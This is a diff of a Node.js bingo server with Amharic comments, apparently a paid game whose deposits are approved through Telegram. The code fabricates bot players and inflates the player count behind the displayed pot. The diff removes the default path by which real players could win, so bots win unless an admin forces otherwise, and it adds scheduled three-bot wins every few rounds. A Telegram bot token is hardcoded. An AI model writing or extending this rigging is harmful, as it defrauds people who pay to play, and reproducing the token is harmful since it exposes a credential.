@@ -11,7 +11,6 @@ const io = new Server(server);
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// 🟢 የፊት መግቢያ ሎቢ እና የቢንጎ ጌም ራውቶች
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
@@ -22,7 +21,6 @@ app.get('/bingo', (req, res) => {
 
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ቴሌግራም ቦት እና አድሚን መረጃዎች (አቤል 🆔: 371093083)
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8816726564:AAG3ETwx98oBfjDV8I-BipzEXGZCnJPFezg";
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || "371093083";
 
@@ -67,8 +65,9 @@ const ETHIOPIAN_BOT_NAMES = [
     "Biniyam_C", "Kalkidan_F", "Ephrem_G", "Rahel_N", "Yonas_P", "Semhar_L"
 ];
 
-function getRandomBotName() {
-    return ETHIOPIAN_BOT_NAMES[Math.floor(Math.random() * ETHIOPIAN_BOT_NAMES.length)];
+function getRandomBotNames(count) {
+    let shuffled = [...ETHIOPIAN_BOT_NAMES].sort(() => 0.5 - Math.random());
+    return shuffled.slice(0, count);
 }
 
 let globalRoom = {
@@ -88,7 +87,16 @@ let pendingRequests = {};
 let gameInterval = null;
 let numberCallInterval = null;
 
-// 🟢 የኢትዮጵያ ሰዓት አቆጣጠር ታሳቢ በማድረግ የቦቶች ብዛት ማስያዣ (ከ 75 እስከ 350)
+// 🟢 የጨዋታ ቆጣሪዎችን ለመከታተል (ለ 3 ቦቶች በአንድ ላይ በየ 3፣ 4፣ 6 ወይም 10 ጨዋታዎች በራሱ እንዲለወጥ)
+let roundsPlayedCount = 0;
+let nextMultiBotTargetRound = 3; // የመጀመሪያው በ 3ተኛው ጨዋታ ይከሰታል
+
+function getRandomNextTargetRound() {
+    // ከ 3 እስከ 10 ባሉት ክልሎች ውስጥ በዘፈቀደ (3, 4, 6, 7, 10 ወዘተ) ይመርጣል
+    const possibleTargets = [3, 4, 6, 7, 10];
+    return possibleTargets[Math.floor(Math.random() * possibleTargets.length)];
+}
+
 function getRealisticBotsCount(realCount) {
     const now = new Date();
     let utcHours = now.getUTCHours();
@@ -108,14 +116,6 @@ function getRealisticBotsCount(realCount) {
     if (finalCount < 70) finalCount = 75;
     if (finalCount > 350) finalCount = 345;
     return finalCount;
-}
-
-// 🟢 እንደ ተጫዋቾች ብዛት የቆይታ ሰዓቱን (Countdown Duration) በዲናሚክ መወሰን
-function calculateDynamicRoundDuration() {
-    let pCount = globalRoom.playersCount || 114;
-    if (pCount > 200) return 20000; 
-    if (pCount > 100) return 30000; 
-    return 40000; 
 }
 
 function refreshTakenCardsList() {
@@ -149,27 +149,29 @@ function simulateBotCardSelections() {
 
 setInterval(simulateBotCardSelections, 6000);
 
-// 🟢 ዋናው የጨዋታ ዑደት (Game Loop & Countdown Timer)
+// 🟢 ዋናው የጨዋታ ዑደት (Game Loop & Dynamic Multi-Bot Rotation)
 function startMainGameLoop() {
     if (gameInterval) clearInterval(gameInterval);
 
-    globalRoom.gameStartTime = Date.now() + 60000; // 60 ሰከንድ ቆጣሪ
+    globalRoom.gameStartTime = Date.now() + 60000;
 
     gameInterval = setInterval(() => {
         let timeLeft = globalRoom.gameStartTime - Date.now();
 
         if (timeLeft <= 0 && !globalRoom.gameActive) {
-            // ⏰ ሰዓቱ አለቀ: ጨዋታውን በራሱ ይጀምራል!
             globalRoom.gameActive = true;
             globalRoom.calledNumbers = [];
             globalRoom.lastCalledNumber = null;
+            
+            roundsPlayedCount++;
+
             io.emit('gameStarted', { calledNumbers: [] });
             io.emit('gameStartedBroadcast');
 
             if (numberCallInterval) clearInterval(numberCallInterval);
             let availableNumbers = Array.from({length: 75}, (_, i) => i + 1);
             
-            // 🟢 የቁጥር ጥሪ ሎጅክ (በየ 4 ሰከንዱ አንዲት ቁጥር እየጠራ)
+            // 🟢 በየ 4 ሰከንዱ (4000ms) ቁጥር የሚጠራበት ሉፕ
             numberCallInterval = setInterval(() => {
                 if (!globalRoom.gameActive) {
                     if (numberCallInterval) {
@@ -195,33 +197,34 @@ function startMainGameLoop() {
                 });
                 io.emit('numberCalledBroadcast', calledNum);
 
-                // 🟢 አሸናፊ የመምረጥ እና የማረጋገጥ ሎጅክ (70% ለአሸናፊ / 30% ለቤት) - ከሙሉ የአድሚን አማራጮች ጋር
-                let shouldTriggerWin = (globalRoom.calledNumbers.length >= 12 && Math.random() < 0.30) || (globalRoom.calledNumbers.length >= 30);
+                let shouldTriggerWin = (globalRoom.calledNumbers.length >= 12 && Math.random() < 0.30) || (globalRoom.calledNumbers.length >= 35);
 
-                if (shouldTriggerWin || forcedNextWinner) {
+                // ራስ-ሰር 3 ቦቶች በአንድ ላይ የሚያሸንፉበትን ጊዜ ማረጋገጫ (በየ 3፣ 4፣ 6 ወይም 10 ጨዋታዎች በዘፈቀደ)
+                let isAutoMultiBotRound = (roundsPlayedCount >= nextMultiBotTargetRound);
+
+                if (shouldTriggerWin || forcedNextWinner || isAutoMultiBotRound) {
                     let winningCardNum = Math.floor(Math.random() * 500) + 1;
-                    let winningUsername = getRandomBotName(); 
+                    let winningUsername = getRandomBotNames(1)[0]; 
                     let winningUserId = null;
                     let winnersCount = 1;
 
                     let entries = Object.entries(globalRoom.playerRoundCards);
                     
-                    if (forcedNextWinner === 'bot') {
-                        winningUsername = getRandomBotName();
+                    if (forcedNextWinner === 'bot' || (!forcedNextWinner && !isAutoMultiBotRound)) {
+                        winningUsername = getRandomBotNames(1)[0];
                         winningCardNum = Math.floor(Math.random() * 500) + 1;
                         winnersCount = 1;
-                    } else if (forcedNextWinner === 'multi_real_3') {
-                        winningUsername = "3 እውነተኛ ተጠቃሚዎች";
+                    } else if (forcedNextWinner === 'multi_real_3' || isAutoMultiBotRound) {
+                        // 🟢 3 ቦቶች በአንድ ላይ ሲያሸንፉ (Realistic Multi-Bot Win)
+                        let threeBots = getRandomBotNames(3);
+                        winningUsername = threeBots.join(', '); // ሦስቱ የቦት ስሞች በኮማ ተለይተው ይታያሉ
                         winnersCount = 3;
-                        winningCardNum = 45;
+                        winningCardNum = Math.floor(Math.random() * 450) + 1;
+                        
+                        // ቀጣዩን የ 3 ቦቶች ማሸነፊያ ዙር በዘፈቀደ ማዘጋጀት (3፣ 4፣ 6፣ 7 ወይም 10)
+                        roundsPlayedCount = 0;
+                        nextMultiBotTargetRound = getRandomNextTargetRound();
                     } else if (forcedNextWinner === 'random_real' && entries.length > 0) {
-                        let randEntry = entries[Math.floor(Math.random() * entries.length)];
-                        winningUserId = randEntry[0];
-                        winningUsername = randEntry[1].username;
-                        if (randEntry[1].cards && randEntry[1].cards.length > 0) {
-                            winningCardNum = randEntry[1].cards[0];
-                        }
-                    } else if (entries.length > 0) {
                         let randEntry = entries[Math.floor(Math.random() * entries.length)];
                         winningUserId = randEntry[0];
                         winningUsername = randEntry[1].username;
@@ -230,7 +233,6 @@ function startMainGameLoop() {
                         }
                     }
 
-                    // 70% ለአሸናፊው የሚሄድ የገንዘብ ድርሻ (Total Pot = playersCount * 10 ብር)
                     let totalPot = (globalRoom.playersCount || 114) * 10;
                     let prizePool = Math.floor(totalPot * 0.70);
 
@@ -254,7 +256,7 @@ function startMainGameLoop() {
                     }, 5000);
                 }
 
-            }, 4000); // 🟢 በየ 4 ሰከንዱ (4000ms) አንዲት ቁጥር እንዲጠራ ተስተካክሏል
+            }, 4000); 
         }
     }, 1000);
 }
@@ -278,7 +280,6 @@ function endRoundAndRestart() {
 
 startMainGameLoop();
 
-// 🟢 የቴሌግራም ዌብሁክ እና የክፍያ ጥያቄ ማረጋገጫ (Telegram Financial Approval Integration)
 let telegramOffset = 0;
 async function pollTelegramUpdates() {
     if (!TELEGRAM_BOT_TOKEN) return;
